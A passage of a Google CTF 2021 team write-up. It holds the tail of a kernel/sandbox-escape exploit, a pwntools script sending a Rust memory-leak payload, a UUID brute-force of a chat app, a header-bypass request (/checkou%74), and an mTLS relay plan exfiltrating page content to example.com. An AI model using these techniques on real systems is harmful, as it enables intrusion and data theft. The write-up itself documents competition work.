    <span class="hljs-built_in">close</span>(mod);

    <span class="hljs-keyword">int</span> y = <span class="hljs-built_in">open</span>(ybin,O_CREAT|O_WRONLY,<span class="hljs-number">0777</span>);
    <span class="hljs-built_in">write</span>(y,mess,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(mess));
    <span class="hljs-built_in">close</span>(y);
    <span class="hljs-built_in">execve</span>(ybin,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">int</span> flag = <span class="hljs-built_in">open</span>(flagpath,<span class="hljs-number">0</span>);
    <span class="hljs-built_in">read</span>(flag,buf,<span class="hljs-number">0x100</span>);
    <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x100</span>);
    <span class="hljs-built_in">my_exit</span>(<span class="hljs-number">0</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">my_exit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> status)</span></span>{
     <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;syscall&quot;</span> :: <span class="hljs-string">&quot;a&quot;</span>(SYS_exit))</span></span>;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[],
                  <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;syscall&quot;</span> :: <span class="hljs-string">&quot;a&quot;</span>(SYS_execve))</span></span>;
}
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;syscall&quot;</span> :: <span class="hljs-string">&quot;a&quot;</span>(SYS_close))</span></span>;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ioctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> request, ...)</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;syscall&quot;</span> :: <span class="hljs-string">&quot;a&quot;</span>(SYS_ioctl))</span></span>;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *__file, <span class="hljs-keyword">int</span> __oflag, ...)</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;syscall&quot;</span> :: <span class="hljs-string">&quot;a&quot;</span>(SYS_open))</span></span>;
}

<span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> __fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *__buf, <span class="hljs-keyword">size_t</span> __n)</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;syscall&quot;</span> :: <span class="hljs-string">&quot;a&quot;</span>(SYS_write))</span></span>;
}

<span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">read</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> __fd, <span class="hljs-keyword">void</span> *__buf, <span class="hljs-keyword">size_t</span> __nbytes)</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;syscall&quot;</span> :: <span class="hljs-string">&quot;a&quot;</span>(SYS_read))</span></span>;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dup2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> oldfd, <span class="hljs-keyword">int</span> newfd)</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;syscall&quot;</span> :: <span class="hljs-string">&quot;a&quot;</span>(SYS_dup2))</span></span>;
}

</code></pre><p>In order to combine our kernel exploit with the one in sandbox escape, we wrote a simple python script and convert <code>sc.bin</code> into Javascript format. The whole exploit.html is kind of large, you can check the entire exploit <a href="https://github.com/st424204/ctf_practice/tree/master/GoogleCTF2021/Fullchain">here</a>.</p>
<p>flag: <code>CTF{next_stop_p2o_fda81a139a70c6d4}</code></p>
<h3 id="memsafety"><a class="header-link" href="#memsafety"></a>memsafety</h3>
<ul class="list">
<li>First, I know nothing about rust pwn. But this <a href="https://ctftime.org/writeup/11859">write-up</a> help me a lot.</li>
</ul>
<pre class="hljs"><code>#!/usr/bin/python2

from pwn import *

r = remote(<span class="hljs-string">&quot;memsafety.2021.ctfcompetition.com&quot;</span>, <span class="hljs-number">1337</span>)

payload=<span class="hljs-string">&#x27;&#x27;&#x27;</span>
    <span class="hljs-keyword">use</span> prelude::{mem::ManuallyDrop, <span class="hljs-built_in">Box</span>, Service};
    <span class="hljs-keyword">use</span> prelude::{log, <span class="hljs-built_in">Vec</span>, <span class="hljs-built_in">String</span>};
    <span class="hljs-keyword">static</span> FLAG: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;CTF{fake flag}&quot;</span>;
    <span class="hljs-meta">#[derive(Debug)]</span>
    <span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">State</span></span>(ManuallyDrop&lt;<span class="hljs-built_in">String</span>&gt;);
    <span class="hljs-keyword">static</span> UNIT: &amp;<span class="hljs-symbol">&#x27;static</span> &amp;<span class="hljs-symbol">&#x27;static</span> () = &amp;&amp;();
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>&lt;<span class="hljs-symbol">&#x27;a</span>, <span class="hljs-symbol">&#x27;b</span>, T&gt;(_: &amp;<span class="hljs-symbol">&#x27;a</span> &amp;<span class="hljs-symbol">&#x27;b</span> (), v: &amp;<span class="hljs-symbol">&#x27;b</span> T) -&gt; &amp;<span class="hljs-symbol">&#x27;a</span> T { v }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">bad</span></span>&lt;<span class="hljs-symbol">&#x27;a</span>, T&gt;(x: &amp;<span class="hljs-symbol">&#x27;a</span> T) -&gt; &amp;<span class="hljs-symbol">&#x27;static</span> T {
        <span class="hljs-keyword">let</span> f: <span class="hljs-function"><span class="hljs-keyword">fn</span></span>(_, &amp;<span class="hljs-symbol">&#x27;a</span> T) -&gt; &amp;<span class="hljs-symbol">&#x27;static</span> T = foo;
        f(UNIT, x)
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">inner</span></span>() -&gt; &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-built_in">Vec</span>&lt;<span class="hljs-built_in">u8</span>&gt; {
        <span class="hljs-keyword">let</span> x = <span class="hljs-built_in">Box</span>::new(<span class="hljs-built_in">Vec</span>::new());
        bad(&amp;*x)
    }
    <span class="hljs-keyword">impl</span> State {
        <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">new</span></span>() -&gt; <span class="hljs-built_in">Box</span>&lt;<span class="hljs-keyword">dyn</span> Service&gt; {
             <span class="hljs-built_in">Box</span>::new(State(ManuallyDrop::new(<span class="hljs-built_in">String</span>::from(FLAG))))
        }
    }
    <span class="hljs-keyword">impl</span> Service <span class="hljs-keyword">for</span> State {
       <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">handle</span></span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, _: &amp;<span class="hljs-built_in">str</span>) {
           <span class="hljs-keyword">let</span> x = inner();
           <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> y = <span class="hljs-built_in">Box</span>::new((<span class="hljs-number">1usize</span>, <span class="hljs-number">2usize</span>, <span class="hljs-number">3usize</span>));

           <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> r = |addr: <span class="hljs-built_in">usize</span>| { y.<span class="hljs-number">0</span> = addr; x[<span class="hljs-number">0</span>] };
           <span class="hljs-keyword">let</span> r32 = |r: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">FnMut</span>(<span class="hljs-built_in">usize</span>) -&gt; <span class="hljs-built_in">u8</span>, x: <span class="hljs-built_in">usize</span>| {
           <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> tmp = <span class="hljs-number">0u32</span>;
                 <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..<span class="hljs-number">4</span> {
                     tmp |= (r(x+<span class="hljs-number">3</span>-j) <span class="hljs-keyword">as</span> <span class="hljs-built_in">u32</span>) &lt;&lt; (<span class="hljs-number">8</span> * j);
                 }
                 tmp
           };
           <span class="hljs-keyword">let</span> dump = |r: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">FnMut</span>(<span class="hljs-built_in">usize</span>) -&gt; <span class="hljs-built_in">u8</span>, start: <span class="hljs-built_in">usize</span>, len: <span class="hljs-built_in">usize</span>| {
               <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> out = <span class="hljs-built_in">Vec</span>::with_capacity(len);
               <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..len {
                   out.push(r(start+i));
               }
               out
           };

           <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> xx: <span class="hljs-built_in">usize</span> = <span class="hljs-string">&quot;&quot;</span>.as_ptr() <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> _ <span class="hljs-keyword">as</span> _;
           log!(<span class="hljs-string">&quot;{}&quot;</span>, xx);

           <span class="hljs-keyword">static</span> AMOUNT: <span class="hljs-built_in">usize</span> = <span class="hljs-number">0x1000</span>;
           <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> output = <span class="hljs-built_in">Vec</span>::new();
           <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..AMOUNT {
               <span class="hljs-keyword">let</span> a = r32(&amp;<span class="hljs-keyword">mut</span> r, xx - <span class="hljs-number">0x500</span>  + i);
               output.push(a <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>);
        

           }
           log!(<span class="hljs-string">&quot;{}&quot;</span>, <span class="hljs-built_in">String</span>::from_utf8_lossy(&amp;output[..]));
       }
       
    }
<span class="hljs-string">&#x27;&#x27;&#x27;</span>
r.send(payload+<span class="hljs-string">&quot;EOF\n&quot;</span>)
r.interactive()

# the flag is CTF{s4ndb0x1n9_s0urc3_1s_h4rd_ev3n_1n_rus7}
</code></pre><h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
<h3 id="letschat"><a class="header-link" href="#letschat"></a>letschat</h3>
<p>This challenge is a simple chatroom website.
We can do some basic operations, such as creating a chat room, sending a message to the chat room, inviting others to the chat room, etc.</p>
<p>Every message sent and every user will be assigned a <strong>UUID</strong>.</p>
<p>Since the challenge did not tell us where the flag is, we naturally went to the <code>admin</code>/<code>flag</code> user or <code>admin</code>/<code>flag</code> chat room to try.
But after a series of common vulnerabilities testing, there was no result, so I started to turn the target to UUID.</p>
<p>We started to guess that the flag might be the earliest message, so the goal was to find a way to predict the UUID (estimate the UUID of the earliest message).</p>
<p>But there are still some uncertain issues here, that is, we are not sure that after we get the message UUID, we can see the content or not. (Because the organizer replaced all the messages to <code>&lt;Player&gt; *******</code> shortly after the start of the game.)</p>
<p>We tried to send a large number of messages first and observe the rules of the UUID obtained:</p>
<pre class="hljs"><code>&quot;8cefa1c9-e6b8<span class="hljs-string">-11</span>eb<span class="hljs-string">-92</span>ce<span class="hljs-string">-9678</span>c088ab04&quot;,
&quot;29563aca-e6b6<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;,
&quot;e3995f2a-e6b5<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;,
&quot;d6d993ba-e6b5<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;,
&quot;0936b5f5-e6b5<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;,
&quot;076ce879-e6b5<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;,
&quot;eeeb9a98-e6b3<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;,
&quot;d093f012-e6b3<span class="hljs-string">-11</span>eb<span class="hljs-string">-92</span>ce<span class="hljs-string">-9678</span>c088ab04&quot;,
&quot;bad4e9eb-e6b3<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;,
&quot;6e37099e-e6b3<span class="hljs-string">-11</span>eb<span class="hljs-string">-86</span>e4<span class="hljs-string">-7253</span>a5121377&quot;,
&quot;1db54013-e6b3<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;,
&quot;f82847c7-e6b2<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;,
&quot;f2d93fb8-e6b2<span class="hljs-string">-11</span>eb<span class="hljs-string">-92</span>ce<span class="hljs-string">-9678</span>c088ab04&quot;,
&quot;f0c5a0c0-e6b2<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;,
&quot;ebb23201-e6b2<span class="hljs-string">-11</span>eb<span class="hljs-string">-92</span>ce<span class="hljs-string">-9678</span>c088ab04&quot;
</code></pre><p>It can be observed that there are only four combinations in the latter half of UUID:</p>
<pre class="hljs"><code><span class="hljs-attribute">11eb</span>-<span class="hljs-number">92</span>ce-<span class="hljs-number">9678</span>c<span class="hljs-number">088</span>ab<span class="hljs-number">04</span>
<span class="hljs-attribute">11eb</span>-<span class="hljs-number">86</span>e<span class="hljs-number">4</span>-<span class="hljs-number">7253</span>a<span class="hljs-number">5121377</span>
<span class="hljs-attribute">11eb</span>-<span class="hljs-number">9805</span>-<span class="hljs-number">362</span>ad<span class="hljs-number">9</span>a<span class="hljs-number">78588</span>
<span class="hljs-attribute">11eb</span>-<span class="hljs-number">88</span>a<span class="hljs-number">1</span>-a<span class="hljs-number">2</span>a<span class="hljs-number">63078</span>d<span class="hljs-number">4</span>f<span class="hljs-number">6</span>
</code></pre><p>The remaining first half will be changed according to timestamp.</p>
<p>So, we tried to send a large number of messages in 1~2 seconds, and got the following UUIDs:</p>
<pre class="hljs"><code>&quot;a7e216c3-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;
&quot;a7e216c8-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;
&quot;a7e216cb-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;
&quot;a7e216cf-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;
&quot;a7e216d1-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-88</span>a1-a2a63078d4f6&quot;
&quot;a8280d5d-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-86</span>e4<span class="hljs-string">-7253</span>a5121377&quot;
&quot;a8280d63-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-86</span>e4<span class="hljs-string">-7253</span>a5121377&quot;
&quot;a8280d68-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-86</span>e4<span class="hljs-string">-7253</span>a5121377&quot;
&quot;a8280d6a-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-86</span>e4<span class="hljs-string">-7253</span>a5121377&quot;
&quot;a8280d6d-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-86</span>e4<span class="hljs-string">-7253</span>a5121377&quot;
&quot;a82be59c-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-92</span>ce<span class="hljs-string">-9678</span>c088ab04&quot;
&quot;a82be5a0-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-92</span>ce<span class="hljs-string">-9678</span>c088ab04&quot;
&quot;a82be5a2-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-92</span>ce<span class="hljs-string">-9678</span>c088ab04&quot;
&quot;a82be5a6-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-92</span>ce<span class="hljs-string">-9678</span>c088ab04&quot;
&quot;a82be5a8-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-92</span>ce<span class="hljs-string">-9678</span>c088ab04&quot;
&quot;a81d9eb7-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;
&quot;a81d9eba-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;
&quot;a81d9ebf-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;
&quot;a81d9ec1-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;
&quot;a81d9ec2-e6f3<span class="hljs-string">-11</span>eb<span class="hljs-string">-9805</span><span class="hljs-string">-362</span>ad9a78588&quot;
</code></pre><p>It can be observed that when the first byte is fixed, it can be divided into two situations:</p>
<ol class="list">
<li>If the second half of the pattern is different, then 2~4 Bytes will be different.</li>
<li>If the second half of the pattern is the same, only the 4th Byte will change.</li>
</ol>
<p>So boldly guess that the first byte is timestamp seconds, and the fourth byte may be milliseconds. (Because in the same second, it will increase with time)</p>
<p>Since we were able to obtain the UUID of other users, I got the UUID of the admin, and then tried to bruteforce the fourth byte of the UUID.</p>
<p>Not surprisingly, most of the messages obtained are <code>&lt;Player&gt; *******</code>.</p>
<p>But something incredible happened! There happened to be a message in it that was not replaced: <code>AzureDiamond:awesome!</code>.</p>
<p>Then keep testing and found that when the number of seconds is different, there will be a message that has not been replaced when the 4th byte is at a certain value:</p>
<pre class="hljs"><code>AzureDiamond:awesome!
(http<span class="hljs-variable">s:</span>//letschat-<span class="hljs-keyword">messages</span>-web.<span class="hljs-number">2021</span>.ctfcompetition.<span class="hljs-keyword">com</span>/a8280d56-e6f3-<span class="hljs-number">11</span>eb-<span class="hljs-number">86</span>e4-<span class="hljs-number">7253</span>a5121377)

Cthon98:hey, <span class="hljs-keyword">if</span> you <span class="hljs-built_in">type</span> in your <span class="hljs-keyword">pw</span>, it will show <span class="hljs-keyword">as</span> stars
(http<span class="hljs-variable">s:</span>//letschat-<span class="hljs-keyword">messages</span>-web.<span class="hljs-number">2021</span>.ctfcompetition.<span class="hljs-keyword">com</span>/<span class="hljs-number">8</span>cefa1c3-e6b8-<span class="hljs-number">11</span>eb-<span class="hljs-number">92</span><span class="hljs-keyword">ce</span>-<span class="hljs-number">9678</span>c088ab04)
</code></pre><p>After googling it, I found that this <a href="https://knowyourmeme.com/memes/hunter2">https://knowyourmeme.com/memes/hunter2</a> has exactly the same words.</p>
<p>I thought it was a boring easter egg, but after continuing to bruteforce, I found out:</p>
<pre class="hljs"><code>Cthon98:er, I just <span class="hljs-keyword">copy</span> pasted YOUR ******&#x27;s <span class="hljs-keyword">and</span> <span class="hljs-keyword">it</span> appears <span class="hljs-keyword">to</span> YOU <span class="hljs-keyword">as</span> FLAG_PART_7_FINAL_PART[flag}] cause <span class="hljs-keyword">its</span> your pw
</code></pre><p>The flag seems to be broken into multiple paragraphs, put them in these sentences!</p>
<p>So far, I have come to a conclusion that there will be a sentence every second, and part of the flag will be put into one of the sentences.</p>
<p>Finally, start to brute force the fourth byte of a large number of UUIDs to get all the flag fragments:</p>
<pre class="hljs"><code>FLAG_PART_1<span class="hljs-selector-attr">[ctf{chat]</span> 
FLAG_PART_2<span class="hljs-selector-attr">[your]</span> my FLAG_PART_3<span class="hljs-selector-attr">[way]</span>-ing FLAG_PART_4<span class="hljs-selector-attr">[to]</span> 
FLAG_PART_5<span class="hljs-selector-attr">[the]</span> 
FLAG_PART_6<span class="hljs-selector-attr">[winning]</span> 
FLAG_PART_7_FINAL_PART<span class="hljs-selector-attr">[flag}]</span>
</code></pre><p>=&gt;</p>
<p><code>CTF{chatyourwaytothewinningflag}</code></p>
<h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed attempts</h4>
<ul class="list">
<li>Register <code>admin</code>, <code>admiN</code>, <code>admin%00</code>, ...<ul class="list">
<li><code>Error 1062: Duplicate entry &#39;admiN&#39; for key &#39;PRIMARY&#39;</code></li>
</ul>
</li>
<li>Leak information by inserting some weird characters.<ul class="list">
<li>leak mysql column name by inserting <code>\xff</code> to parameter:<ul class="list">
<li><code>Error 1366: Incorrect string value: &#39;\xFF&#39; for column &#39;room_id&#39; at row 1</code></li>
<li><code>Error 1366: Incorrect string value: &#39;\xFF&#39; for column &#39;username&#39; at row 1</code></li>
</ul>
</li>
<li>unhandled response(?)<ul class="list">
<li><code>roomName=admin%ff</code> =&gt; <code>Unhandled response from Scan() on login</code></li>
</ul>
</li>
</ul>
</li>
<li>Tried to truncate query statement by <code>;</code><ul class="list">
<li>We found that if we insert <code>;</code> to the parameters, there is very weird behavior like this:<ul class="list">
<li><code>username=;meowmeow&amp;password=meow</code> =&gt; <code>Empty username or password</code> </li>
</ul>
</li>
</ul>
</li>
<li>Case insensitive on joining a room by room name<ul class="list">
<li>After trying, we found that if we have been invited to some room like <code>balsn</code>, then we can join this room with <code>Balsn</code>, <code>bALSn</code>, <code>balSN</code>, ... (case insensitive).</li>
<li>So we tried to create rooms like <code>admiN</code>, <code>admiN%00</code>, <code>admiN%20</code>, ..., then invite ourselves to join <code>admin</code> room, but failed.</li>
</ul>
</li>
<li>Login as <code>AzureDiamond</code><ul class="list">
<li>I tried the username <code>AzureDiamond</code> with password <code>hunter2</code>, then successfully login into this account but nothing was found.</li>
</ul>
</li>
</ul>
<h3 id="gpushop"><a class="header-link" href="#gpushop"></a>gpushop</h3>
<p>This challenge gives a package of very complicated source code.</p>
<p>Inside are the haproxy, varnish, and two laravel websites(nginx+php-fpm).</p>
<p>I spent a lot of time looking at the architecture at the beginning. Simply put, haproxy will forward the request to the backend gpushop and paymeflare.</p>
<p>The concept of paymeflare is a bit like cloudflare (the name is also very similar), you can add a domain and bind it with <code>ip:port</code> (<code>CNAME</code> need to point to the challenge domain)</p>
<p>gpushop is a shopping website (ETH payment). What&#39;s more special is that it judges whether the purchase is successful depends on whether the wallet address in the <code>X-Wallet</code> header has enough ETH.</p>
<p>And <code>X-Wallet</code> header is added by haproxy. By default, it will randomly generate an address for you.</p>
<p>As long as the path is <code>/checkout</code>, haproxy will add <code>X-Wallet</code> header for you.</p>
<pre class="hljs"><code><span class="hljs-string">acl</span> <span class="hljs-string">is_checkout</span> <span class="hljs-string">path_dir</span> <span class="hljs-string">checkout</span>
<span class="hljs-string">http-request</span> <span class="hljs-string">lua</span>.<span class="hljs-string">gen_addr</span> <span class="hljs-string">if</span> <span class="hljs-string">is_checkout</span>
<span class="hljs-string">http-request</span> <span class="hljs-built_in">set-header</span> <span class="hljs-string">X-Wallet</span> %[<span class="hljs-string">var</span>(<span class="hljs-string">txn</span>.<span class="hljs-string">wallet</span>)] <span class="hljs-string">if</span> <span class="hljs-string">is_checkout</span>
</code></pre><p>So the goal is obviously to find a way to get rid of this header.</p>
<br>

<p>According to experience, this multi-layer architecture is usually prone to problems with url path parsing.</p>
<p>So my first instinct was to try <code>/checkouT</code> first and bring my own <code>X-Wallet</code> header, but it failed.</p>
<p>Next, I tried <code>/checkou%74</code>, then it succeeded!</p>
<pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/cart/checkou%74</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>gpushop.2021.ctfcompetition.com
<span class="hljs-attribute">x-wallet</span><span class="hljs-punctuation">: </span>0000000000000000000000000000000000000000
</code></pre><p>After sending this request, the <code>x-wallet</code> was successfully be overwritten, and then I got the flag...WTF</p>
<p class="img-container"><img src="https://github.com/w181496/CTF/blob/master/googlectf-2021-qual/gpushop/gpushop.png?raw=true" alt=""></p>
<p><code>CTF{fdc990bd13fa3a0e760a14b560dd658c}</code></p>
<h3 id="secdriven"><a class="header-link" href="#secdriven"></a>secdriven</h3>
<p>Please see the <a href="https://gist.github.com/terjanq/458d8ec1148e96f7ccbdccfd908c56f6">author&#39;s write-up</a>.</p>
<h3 id="empty-ls"><a class="header-link" href="#empty-ls"></a>empty ls</h3>
<blockquote>
<p>bookgin</p>
</blockquote>
<p>We got firstblood in this challenge!</p>
<p>Let me breifly introduce this not-so-web-but-it&#39;s-fun challenge:</p>
<ol class="list">
<li>The challenge is about <a href="https://en.wikipedia.org/wiki/Mutual_authentication">Mutual TLS (mTLS)</a>. In traditional TLS scenarios, only server is required to present a valid certificate. In mTLS client needs one too.</li>
<li>The flag will be shown on the website on <a href="https://admin.zone443.dev/">https://admin.zone443.dev/</a> if admin&#39;s client certificate is presented. We can also report website to admin and it will click on it. I&#39;m wondering if someone just exploits the browser.</li>
<li>We can register a user <code>foobar</code>, and the challenge will help set a DNS A record of <code>https://foobar.zone443.dev</code> to the IP address we specified.</li>
<li>We need a valid server certificate on <code>foobar.zone443.dev</code>. Because of (3), we can use Let&#39;s encrypt to get one. </li>
</ol>
<p>The key to this challenge is the Common Name and Subject Alt Names fileds on <code>admin.zone443.dev</code>.</p>
<ul class="list">
<li><code>*.zone443.dev</code></li>
<li><code>zone443.dev</code></li>
</ul>
<p>The wildcard domain is interesting. That means the certificate is even valid for <code>foobar.zone443.dev</code>. For now, at least we can perform an innocuous man-in-the-middle (MitM) attack by simplying relaying <code>admin.zone443.dev</code>&#39;s certificate. This is basically the same as a reverse proxy.</p>
<ul class="list">
<li>Admin&#39;s bot visits <code>foobar.zone443</code></li>
<li><code>foobar.zone443</code> resolves to our IP address</li>
<li><code>foobar.zone443</code> simply serves as a TCP relay to <code>admin.zone443</code></li>
<li>Admin&#39;s client certificate is sent to <code>admin.zone443</code></li>
<li><code>admin.zone443</code> returns the flag to admin&#39;s bot</li>
<li>Admin sees flag in <code>https://foobar.zone443.dev/</code></li>
</ul>
<p>Here we assume that <code>admin.zone443</code>&#39;s backend server does not check <code>Host:</code> header. But the traffic is still encrypted thanks to TLS and we cannot sniff the flag. Unless we can directly XSS on <code>admin.zone443.dev</code>, it seems almost impossible to solve this.</p>
<p>Now let&#39;s see the big picture again. In the MitM attack above, the flag is shown under <code>foobar.zone443.dev</code> but we don&#39;t have control on the content since it&#39;s a TCP relay. In common scenario, we can control the content on <code>foobar.zone443.dev</code>, and we can read content but flag is not there.</p>
<p>Combining the two idea above, we have an idea inspired by DNS-rebinding:</p>
<ol class="list">
<li>Set up a crafted web page on <code>https://foobar.zone443.dev/</code> and exfiltrate current page content per 100 ms to <code>https://example.com/?a=...</code></li>
<li>Send the link <code>https://foobar.zone443.dev/</code> to admin&#39;s bot</li>
<li>admin&#39;s bot is browsing <code>https://foobar.zone443.dev/</code> and send traffic to <code>https://example.com/?a=...</code></li>
<li>Shutdown the web server and run a TCP relay to <code>https://admin.zone443.dev/</code> described above.</li>
<li><code>https://admin.zone443.dev/</code>&#39;s wildcard certificate <code>*.zone443.dev</code> is valid for current domain <code>foobar.zone443.dev</code></li>
<li>Admin&#39;s bot sends client certificate through our relay to <code>https://admin.zone443.dev/</code></li>
<li><code>https://admin.zone443.dev/</code> reads admin bot&#39;s certificate and it&#39;s valid.</li>
<li>The flag is returned under the URL content <code>foobar.zone443.dev</code>.</li>
<li>We successfully exfiltrate current page content including the flag to <code>https://example.com/?a=...</code></li>
</ol>
<p>The flag is <code>CTF{m0_ambient_auth_m0_pr0blems}</code>.</p>
<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
<h3 id="pythia"><a class="header-link" href="#pythia"></a>pythia</h3>
<h4 id="description"><a class="header-link" href="#description"></a>Description</h4>
<p>We are given an oracle which we can check if a tuple of a nonce, a ciphertext, and an authentication tag is valid under AES-GCM mode with a fixed key, given that there&#39;s only $26^3$ possbile keys (we know all possibilities but don&#39;t know which one is the actual key). There are 3 keys to recover seperately, and we are restricted to make at most 150 oracle queries.</p>
<p>Though we can choose nonce on our own, it turned out that the nonce is not important, so we assume that the nonce is set to 0 in the following.</p>
<h4 id="aes-gcm"><a class="header-link" href="#aes-gcm"></a>AES-GCM</h4>
<p>AES-GCM is essentially AES-CTF mode with an extra authentication tag. The calculation of authentication tag operates on Galois field $GF(2^{128})$ with modulus $(x^{128} + x^7 + x^2 + x + 1)$. In our case, we don&#39;t have associate data, so the calculation of the tag goes as:</p>
<ul class="list">
<li>Pad the ciphertext with 0s so that the length of the ciphertext is a multiple of 16.</li>
